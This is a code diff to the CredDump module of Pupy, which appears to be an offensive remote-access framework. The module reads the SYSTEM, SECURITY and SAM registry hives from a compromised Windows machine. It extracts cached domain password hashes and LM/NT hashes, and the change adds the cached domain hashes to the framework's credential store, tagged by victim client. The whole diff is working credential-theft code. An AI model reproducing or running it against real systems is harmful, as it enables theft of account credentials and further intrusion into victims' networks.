@@ -171,6 +171,9 @@ class CredDump(PupyModule):
             self.warning("error deleting temporary files: %s"%str(e))
 
         # Time to run creddump!
+        db = Credentials()
+        hashes = []
+
         # HiveFileAddressSpace - Volatilty
         sysaddr = HiveFileAddressSpace(os.path.join(self.rep, "SYSTEM"))
         secaddr = HiveFileAddressSpace(os.path.join(self.rep, "SECURITY"))
@@ -180,13 +183,13 @@ class CredDump(PupyModule):
         self.success("dumping cached domain passwords...")
 
         for (u, d, dn, h) in dump_hashes(sysaddr, secaddr, is_vista):
-            self.success("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
+            self.log("%s:%s:%s:%s" % (u.lower(), h.encode('hex'),
                 d.lower(), dn.lower()))
+            hashes.append({'hashes': "%s:%s:%s:%s" % (u.lower(), h.encode('hex'), d.lower(), dn.lower()), 'Tool': 'Creddump', 'uid':self.client.short_name()})
 
         self.success("dumping LM and NT hashes...")
         bootkey = get_bootkey(sysaddr)
         hbootkey = get_hbootkey(samaddr,bootkey)
-        hashes = []
         for user in get_user_keys(samaddr):
             lmhash, nthash = get_user_hashes(user,hbootkey)
             if not lmhash: lmhash = empty_lm
@@ -194,7 +197,6 @@ class CredDump(PupyModule):
             self.log("%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')))
             hashes.append({'hashes': "%s:%d:%s:%s:::" % (get_user_name(user), int(user.Name, 16), lmhash.encode('hex'), nthash.encode('hex')), 'Tool': 'Creddump', 'uid':self.client.short_name()})
 
-        db = Credentials()
         db.add(hashes)
         self.success("Hashes stored on the database")
 
